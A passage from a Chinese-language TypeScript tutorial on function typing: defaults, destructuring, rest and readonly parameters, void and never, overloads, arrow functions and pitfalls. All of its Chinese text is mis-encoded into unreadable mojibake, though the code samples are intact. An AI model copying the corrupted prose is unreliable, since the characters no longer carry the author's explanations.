<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// counté»˜è®¤å€¼ä¸º10ï¼Œç±»å‹è‡ªåŠ¨æ¨å¯¼ä¸ºnumber</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">repeat</span>(<span class="hljs-params">str: <span class="hljs-built_in">string</span>, count = <span class="hljs-number">10</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">repeat</span>(count);
}

<span class="hljs-title function_">repeat</span>(<span class="hljs-string">"TS"</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œé‡å¤10æ¬¡</span>
<span class="hljs-title function_">repeat</span>(<span class="hljs-string">"JS"</span>, <span class="hljs-number">5</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œé‡å¤5æ¬¡</span>
<span class="hljs-comment">// repeat("React", "5"); //  æŠ¥é”™ï¼šcountå¿…é¡»æ˜¯number</span>
</code></pre>
<h4 data-id="heading-7">3. å‚æ•°è§£æ„ï¼ˆå¯¹è±¡/æ•°ç»„ï¼‰</h4>
<p>å‡½æ•°å‚æ•°æ˜¯å¯¹è±¡/æ•°ç»„æ—¶ï¼Œå¯ç›´æ¥è§£æ„å¹¶çº¦æŸç±»å‹ï¼Œè®©ä»£ç æ›´ç®€æ´ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. å¯¹è±¡è§£æ„ + ç±»å‹çº¦æŸ</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printUser</span>(<span class="hljs-params">{ name, age }: User</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å§“åï¼š<span class="hljs-subst">${name}</span>ï¼Œå¹´é¾„ï¼š<span class="hljs-subst">${age}</span>`</span>);
}

<span class="hljs-comment">// 2. æ•°ç»„è§£æ„ + ç±»å‹çº¦æŸ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printArr</span>(<span class="hljs-params">[a, b]: [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">string</span>]</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b);
}

<span class="hljs-title function_">printUser</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> }); <span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-title function_">printArr</span>([<span class="hljs-number">1</span>, <span class="hljs-string">"TS"</span>]); <span class="hljs-comment">//  æ­£ç¡®</span>
</code></pre>
<h4 data-id="heading-8">4. restå‚æ•°ï¼ˆå‰©ä½™å‚æ•°ï¼‰</h4>
<p>ç”¨ <code>...</code> æ¥æ”¶å¤šä¸ªå‚æ•°ï¼Œç±»å‹å¿…é¡»æ˜¯<strong>æ•°ç»„</strong>ï¼Œä¸”åªèƒ½æ”¾åœ¨å‚æ•°åˆ—è¡¨æœ€åï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ±‚å’Œå‡½æ•°ï¼šæ¥æ”¶ä»»æ„å¤šä¸ªæ•°å­—å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">...nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> nums.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
}

<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œè¿”å›3</span>
<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// æ­£ç¡®ï¼Œè¿”å›10</span>
<span class="hljs-comment">// sum(1, "2"); //  æŠ¥é”™ï¼šrestå‚æ•°å¿…é¡»æ˜¯number[]</span>
</code></pre>
<h4 data-id="heading-9">5. readonlyåªè¯»å‚æ•°</h4>
<p>ç”¨ <code>readonly</code> çº¦æŸå‚æ•°ï¼ˆé€šå¸¸æ˜¯æ•°ç»„/å¯¹è±¡ï¼‰ï¼Œé¿å…å‡½æ•°å†…éƒ¨ä¿®æ”¹å…¥å‚ï¼Œæå‡ä»£ç å¥å£®æ€§ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çº¦æŸæ•°ç»„å‚æ•°ä¸ºåªè¯»ï¼Œç¦æ­¢ä¿®æ”¹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printArr</span>(<span class="hljs-params">arr: <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// arr.push(4); //  æŠ¥é”™ï¼šreadonlyæ•°ç»„ä¸èƒ½è°ƒç”¨push</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr);
}

<span class="hljs-title function_">printArr</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">//  æ­£ç¡®</span>

<span class="hljs-comment">// çº¦æŸå¯¹è±¡å‚æ•°çš„å±æ€§ä¸ºåªè¯»</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printObj</span>(<span class="hljs-params">obj: { <span class="hljs-keyword">readonly</span> name: <span class="hljs-built_in">string</span> }</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// obj.name = "æå››"; //  æŠ¥é”™ï¼šnameæ˜¯åªè¯»å±æ€§</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>);
}
</code></pre>
<h3 data-id="heading-10">ä¸‰ã€è¿”å›å€¼è¿›é˜¶ï¼švoidç±»å‹ä¸neverç±»å‹</h3>
<p>TSå¯¹å‡½æ•°è¿”å›å€¼çš„çº¦æŸä¸æ­¢åŸºç¡€ç±»å‹ï¼Œ<code>void</code> å’Œ <code>never</code> æ˜¯ä¸¤ä¸ªç‰¹æ®Šä¸”å¸¸ç”¨çš„è¿”å›å€¼ç±»å‹ã€‚</p>
<h4 data-id="heading-11">1. voidç±»å‹ï¼šæ— è¿”å›å€¼</h4>
<p>å‡½æ•°æ²¡æœ‰returnï¼ˆæˆ–return undefinedï¼‰æ—¶ï¼Œè¿”å›å€¼ç±»å‹ä¸º <code>void</code>ï¼Œè¡¨ç¤ºâ€œæ— ä»»ä½•è¿”å›å€¼â€ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çº¯æ‰“å°å‡½æ•°ï¼Œæ— è¿”å›å€¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params">msg: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg);
  <span class="hljs-comment">// return undefined; // å¯é€‰ï¼Œvoidå…è®¸è¿”å›undefined</span>
}

<span class="hljs-keyword">const</span> res = <span class="hljs-title function_">log</span>(<span class="hljs-string">"Hello TS"</span>); <span class="hljs-comment">// resçš„ç±»å‹ä¸ºvoid</span>
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼š<code>void</code> ä¸æ˜¯ <code>undefined</code>â€”â€”<code>void</code> è¡¨ç¤ºâ€œå‡½æ•°æ— è¿”å›å€¼â€ï¼Œè€Œ <code>undefined</code> æ˜¯ä¸€ä¸ªå…·ä½“çš„å€¼ï¼›ä½†å‡½æ•°è¿”å› <code>undefined</code> æ—¶ï¼Œå¯èµ‹å€¼ç»™ <code>void</code> ç±»å‹å˜é‡ã€‚</p>
<h4 data-id="heading-12">2. neverç±»å‹ï¼šæ°¸ä¸è¿”å›</h4>
<p>å‡½æ•°æ°¸è¿œä¸ä¼šæ‰§è¡Œå®Œï¼ˆæŠ›å‡ºé”™è¯¯ã€æ— é™å¾ªç¯ï¼‰æ—¶ï¼Œè¿”å›å€¼ç±»å‹ä¸º <code>never</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åœºæ™¯1ï¼šæŠ›å‡ºé”™è¯¯çš„å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params">msg: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(msg); <span class="hljs-comment">// å‡½æ•°æ‰§è¡Œåˆ°è¿™é‡Œç»ˆæ­¢ï¼Œæ°¸ä¸è¿”å›</span>
}

<span class="hljs-comment">// åœºæ™¯2ï¼šæ— é™å¾ªç¯çš„å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">infiniteLoop</span>(<span class="hljs-params"/>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {} <span class="hljs-comment">// æ°¸è¿œä¸ä¼šé€€å‡ºå¾ªç¯</span>
}

<span class="hljs-comment">// åœºæ™¯3ï¼šç©·å°½æ£€æŸ¥ï¼ˆç¡®ä¿switchè¦†ç›–æ‰€æœ‰æƒ…å†µï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-string">"success"</span> | <span class="hljs-string">"error"</span> | <span class="hljs-string">"pending"</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleStatus</span>(<span class="hljs-params">status: Status</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">switch</span> (status) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"success"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æˆåŠŸ"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"error"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¤±è´¥"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"pending"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŠ è½½ä¸­"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-attr">default</span>:
      <span class="hljs-comment">// è‹¥æ¼å†™caseï¼Œè¿™é‡Œä¼šæç¤ºï¼šstatusç±»å‹ä¸ºneverï¼Œæ— æ³•èµ‹å€¼</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">_exhaustiveCheck</span>: <span class="hljs-built_in">never</span> = status;
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`æœªçŸ¥çŠ¶æ€ï¼š<span class="hljs-subst">${_exhaustiveCheck}</span>`</span>);
  }
}
</code></pre>
<h3 data-id="heading-13">å››ã€å‡½æ•°å†…çš„å±€éƒ¨ç±»å‹</h3>
<p>TSå…è®¸åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰ç±»å‹ï¼ˆå±€éƒ¨ç±»å‹ï¼‰ï¼Œä½œç”¨åŸŸä»…é™å‡½æ•°å†…éƒ¨ï¼Œé¿å…å…¨å±€ç±»å‹æ±¡æŸ“ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// å‡½æ•°å†…çš„å±€éƒ¨ç±»å‹ï¼Œå¤–éƒ¨æ— æ³•è®¿é—®</span>
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };
  
  <span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user);
}

<span class="hljs-title function_">handleUser</span>();
<span class="hljs-comment">// const u: User = { name: "æå››", age: 30 }; // æŠ¥é”™ï¼šUseræœªå®šä¹‰</span>
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šç±»å‹ä»…åœ¨å½“å‰å‡½æ•°å†…ä½¿ç”¨ï¼Œæ— éœ€æš´éœ²åˆ°å…¨å±€ï¼Œæå‡ä»£ç å°è£…æ€§ã€‚</p>
<h3 data-id="heading-14">äº”ã€é«˜é˜¶å‡½æ•°ï¼šå‡½æ•°ä½œä¸ºå‚æ•°/è¿”å›å€¼</h3>
<p>é«˜é˜¶å‡½æ•°æ˜¯â€œæ¥æ”¶å‡½æ•°ä½œä¸ºå‚æ•°â€æˆ–â€œè¿”å›å‡½æ•°â€çš„å‡½æ•°ï¼ŒTSå¯¹é«˜é˜¶å‡½æ•°çš„ç±»å‹çº¦æŸæ˜¯è¿›é˜¶é‡ç‚¹ã€‚</p>
<h4 data-id="heading-15">1. å‡½æ•°ä½œä¸ºå‚æ•°</h4>
<p>æœ€å¸¸è§çš„åœºæ™¯ï¼ˆå¦‚æ•°ç»„çš„map/filterï¼‰ï¼Œç”¨å‡½æ•°ç±»å‹è¡¨è¾¾å¼çº¦æŸå…¥å‚å‡½æ•°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰é«˜é˜¶å‡½æ•°ï¼šæ¥æ”¶æ•°ç»„å’Œå¤„ç†å‡½æ•°ï¼Œè¿”å›æ–°æ•°ç»„</span>
<span class="hljs-keyword">function</span> mapArr&lt;T, U&gt;(<span class="hljs-attr">arr</span>: T[], <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">item: T</span>) =&gt;</span> U): U[] {
  <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">map</span>(handler);
}

<span class="hljs-comment">// ä½¿ç”¨ï¼šTSè‡ªåŠ¨æ¨å¯¼ç±»å‹</span>
<span class="hljs-keyword">const</span> nums = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> strNums = <span class="hljs-title function_">mapArr</span>(nums, <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> n.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// strNums: string[]</span>
<span class="hljs-keyword">const</span> doubles = <span class="hljs-title function_">mapArr</span>(nums, <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> n * <span class="hljs-number">2</span>); <span class="hljs-comment">// doubles: number[]</span>
</code></pre>
<h4 data-id="heading-16">2. å‡½æ•°ä½œä¸ºè¿”å›å€¼</h4>
<p>è¿”å›å‡½æ•°æ—¶ï¼Œç”¨å‡½æ•°ç±»å‹è¡¨è¾¾å¼çº¦æŸè¿”å›å€¼çš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// é«˜é˜¶å‡½æ•°ï¼šè¿”å›ä¸€ä¸ªåŠ æ³•å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createAddFunc</span>(<span class="hljs-params">num: <span class="hljs-built_in">number</span></span>): <span class="hljs-function">(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> x + num;
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> add5 = <span class="hljs-title function_">createAddFunc</span>(<span class="hljs-number">5</span>);
<span class="hljs-keyword">const</span> res = <span class="hljs-title function_">add5</span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// res: numberï¼Œå€¼ä¸º15</span>
</code></pre>
<h3 data-id="heading-17">å…­ã€å‡½æ•°é‡è½½ï¼šå¤„ç†å¤šç±»å‹å…¥å‚/è¿”å›å€¼</h3>
<p>å½“å‡½æ•°éœ€è¦æ”¯æŒâ€œä¸åŒå‚æ•°ç±»å‹/æ•°é‡ â†’ ä¸åŒè¿”å›å€¼ç±»å‹â€æ—¶ï¼Œç”¨<strong>å‡½æ•°é‡è½½</strong>å®ç°ç²¾å‡†çº¦æŸï¼ˆé¿å…è”åˆç±»å‹çš„æ¨¡ç³Šæ€§ï¼‰ã€‚</p>
<h4 data-id="heading-18">1. å‡½æ•°é‡è½½çš„åŸºç¡€å†™æ³•</h4>
<p>å…ˆå†™â€œé‡è½½ç­¾åâ€ï¼ˆå®šä¹‰å‚æ•°-è¿”å›å€¼çš„å¯¹åº”å…³ç³»ï¼‰ï¼Œå†å†™â€œå®ç°ç­¾åâ€ï¼ˆå®é™…é€»è¾‘ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ­¥éª¤1ï¼šå®šä¹‰é‡è½½ç­¾åï¼ˆå¯å†™å¤šä¸ªï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatData</span>(<span class="hljs-params">data: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>; <span class="hljs-comment">// å…¥å‚string â†’ è¿”å›string</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatData</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>[]; <span class="hljs-comment">// å…¥å‚number â†’ è¿”å›number[]</span>

<span class="hljs-comment">// æ­¥éª¤2ï¼šå®šä¹‰å®ç°ç­¾å</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatData</span>(<span class="hljs-params">data: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>[] {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data === <span class="hljs-string">"string"</span>) {
    <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">toUpperCase</span>(); <span class="hljs-comment">// åŒ¹é…ç¬¬ä¸€ä¸ªé‡è½½</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-title class_">String</span>(data), <span class="hljs-title class_">Number</span>); <span class="hljs-comment">// åŒ¹é…ç¬¬äºŒä¸ªé‡è½½</span>
  }
}

<span class="hljs-comment">// è°ƒç”¨ï¼šTSè‡ªåŠ¨æ¨å¯¼è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">const</span> strRes = <span class="hljs-title function_">formatData</span>(<span class="hljs-string">"ts"</span>); <span class="hljs-comment">// strRes: string</span>
<span class="hljs-keyword">const</span> numRes = <span class="hljs-title function_">formatData</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// numRes: number[]</span>
<span class="hljs-comment">// formatData(true); // æŠ¥é”™ï¼šæ— åŒ¹é…çš„é‡è½½ç­¾å</span>
</code></pre>
<h4 data-id="heading-19">2. å‡½æ•°é‡è½½çš„æ³¨æ„äº‹é¡¹</h4>
<ul>
<li>é‡è½½ç­¾ååªç”¨äºç±»å‹æ£€æŸ¥ï¼Œä¸ä¼šæ‰§è¡Œï¼Œé€»è¾‘å…¨éƒ¨å†™åœ¨å®ç°ç­¾åä¸­ï¼›</li>
<li>å®ç°ç­¾åçš„å‚æ•°ç±»å‹éœ€åŒ…å«æ‰€æœ‰é‡è½½ç­¾åçš„å‚æ•°ç±»å‹ï¼›</li>
<li>é¿å…è¿‡åº¦é‡è½½ï¼šç®€å•åœºæ™¯ç”¨è”åˆç±»å‹å³å¯ï¼Œé‡è½½é€‚åˆâ€œå‚æ•°å’Œè¿”å›å€¼å¼ºå…³è”â€çš„åœºæ™¯ã€‚</li>
</ul>
<h3 data-id="heading-20">ä¸ƒã€ç®­å¤´å‡½æ•°çš„ç±»å‹çº¦æŸ</h3>
<p>ç®­å¤´å‡½æ•°æ˜¯TSä¸­æœ€å¸¸ç”¨çš„å‡½æ•°å½¢å¼ï¼Œå…¶ç±»å‹çº¦æŸæ›´ç®€æ´ï¼Œä¸”æ— éœ€å¤„ç†thisæŒ‡å‘é—®é¢˜ã€‚</p>
<h4 data-id="heading-21">1. ç®­å¤´å‡½æ•°çš„åŸºç¡€ç±»å‹çº¦æŸ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼1ï¼šç›´æ¥çº¦æŸå‚æ•°å’Œè¿”å›å€¼</span>
<span class="hljs-keyword">const</span> add = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a + b;

<span class="hljs-comment">// æ–¹å¼2ï¼šç”¨ç±»å‹åˆ«åçº¦æŸï¼ˆå¤ç”¨åœºæ™¯ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">add2</span>: <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;
</code></pre>
<h4 data-id="heading-22">2. ç®­å¤´å‡½æ•°çš„thisæŒ‡å‘ï¼ˆæ— éœ€çº¦æŸï¼‰</h4>
<p>ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„thisï¼Œä¼šç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„thisï¼ŒTSä¼šè‡ªåŠ¨æ¨å¯¼ï¼Œæ— éœ€æ‰‹åŠ¨çº¦æŸï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> user = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"æå››"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,
  <span class="hljs-comment">// ç®­å¤´å‡½æ•°çš„thisç»§æ‰¿è‡ªå¤–å±‚ï¼ˆéä¸¥æ ¼æ¨¡å¼ä¸‹æ˜¯windowï¼‰</span>
  <span class="hljs-attr">sayHi</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// TSæç¤ºï¼šthisä¸Šä¸å­˜åœ¨nameå±æ€§</span>
  },
  <span class="hljs-comment">// æ™®é€šå‡½æ•°çš„thisæŒ‡å‘userå®ä¾‹</span>
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// æ­£ç¡®ï¼ŒthisæŒ‡å‘user</span>
  },
};
</code></pre>
<h3 data-id="heading-23">å…«ã€å®æˆ˜é¿å‘æŒ‡å—</h3>
<h4 data-id="heading-24">1. é¿å…ç”¨anyå¼±åŒ–å‡½æ•°ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  é”™è¯¯ï¼šanyå¯¼è‡´ç±»å‹æ£€æŸ¥å¤±æ•ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleData</span>(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">any</span> {
  <span class="hljs-keyword">return</span> data;
}

<span class="hljs-comment">//  æ­£ç¡®ï¼šç”¨æ³›å‹æ›¿ä»£any</span>
<span class="hljs-keyword">function</span> handleData&lt;T&gt;(<span class="hljs-attr">data</span>: T): T {
  <span class="hljs-keyword">return</span> data;
}
</code></pre>
<h4 data-id="heading-25">2. å¯é€‰å‚æ•°å¿…é¡»æ”¾åœ¨å¿…é€‰å‚æ•°å</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  æŠ¥é”™ï¼šå¯é€‰å‚æ•°ä¸èƒ½åœ¨å¿…é€‰å‚æ•°å‰</span>
<span class="hljs-comment">// function fn(a?: number, b: string): void {}</span>

<span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">b: <span class="hljs-built_in">string</span>, a?: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">void</span> {}
</code></pre>
<h4 data-id="heading-26">3. restå‚æ•°åªèƒ½æœ‰ä¸€ä¸ªä¸”æ”¾æœ€å</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  æŠ¥é”™ï¼šrestå‚æ•°å¿…é¡»æ˜¯æœ€åä¸€ä¸ª</span>
<span class="hljs-comment">// function fn(...nums: number[], a: string): void {}</span>

<span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">string</span>, ...nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">void</span> {}
</code></pre>
<h4 data-id="heading-27">4. é‡è½½ç­¾åä¸å®ç°ç­¾åè¦å…¼å®¹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  æŠ¥é”™ï¼šå®ç°ç­¾åçš„è¿”å›å€¼ä¸å…¼å®¹é‡è½½ç­¾å</span>
<span class="hljs-comment">// function fn(a: string): string;</span>
<span class="hljs-comment">// function fn(a: number): number;</span>
<span class="hljs-comment">// function fn(a: string | number): string { ... }</span>

<span class="hljs-comment">//  æ­£ç¡®ï¼šå®ç°ç­¾åè¿”å›å€¼åŒ…å«æ‰€æœ‰é‡è½½è¿”å›å€¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> { ... }
</code></pre>
<h3 data-id="heading-28">ä¹ã€æ ¸å¿ƒæ€»ç»“</h3>
<ol>
<li>å‡½æ•°ç±»å‹æè¿°ï¼šä¼˜å…ˆç”¨ã€Œå‡½æ•°ç±»å‹è¡¨è¾¾å¼ã€ï¼Œé¿å…å®½æ³›çš„<code>Function</code>ç±»å‹ï¼›</li>
<li>å‚æ•°çº¦æŸï¼šæŒæ¡å¯é€‰å‚æ•°ï¼ˆ?ï¼‰ã€é»˜è®¤å€¼ã€è§£æ„ã€restå‚æ•°ã€readonlyå‚æ•°ï¼Œè¦†ç›–æ‰€æœ‰å‚æ•°åœºæ™¯ï¼›</li>
<li>è¿”å›å€¼çº¦æŸï¼š<code>void</code>è¡¨ç¤ºæ— è¿”å›å€¼ï¼Œ<code>never</code>è¡¨ç¤ºæ°¸ä¸è¿”å›ï¼ˆå¸¸ç”¨äºé”™è¯¯/å¾ªç¯ï¼‰ï¼›</li>
<li>è¿›é˜¶ç‰¹æ€§ï¼šå±€éƒ¨ç±»å‹æå‡å°è£…æ€§ï¼Œé«˜é˜¶å‡½æ•°ç”¨æ³›å‹çº¦æŸå‚æ•°/è¿”å›å€¼ï¼Œé‡è½½é€‚é…å¤šç±»å‹å…¥å‚ï¼›</li>
<li>é¿å‘æ ¸å¿ƒï¼šä¸ç”¨anyå¼±åŒ–ç±»å‹ï¼Œå‚æ•°ä½ç½®ï¼ˆå¯é€‰/restï¼‰éµå®ˆè§„åˆ™ï¼Œé‡è½½ç­¾åä¸å®ç°ç­¾åå…¼å®¹ã€‚</li>
</ol>
<p>æŒæ¡è¿™äº›çŸ¥è¯†ç‚¹ï¼Œä½ çš„TSå‡½æ•°ç±»å‹çº¦æŸä¼šæ—¢ç²¾å‡†åˆçµæ´»ï¼Œå½»åº•å‘Šåˆ«â€œå‡½æ•°ç±»å‹æŠ¥é”™å´æ‰¾ä¸åˆ°åŸå› â€çš„é—®é¢˜ï½</p>
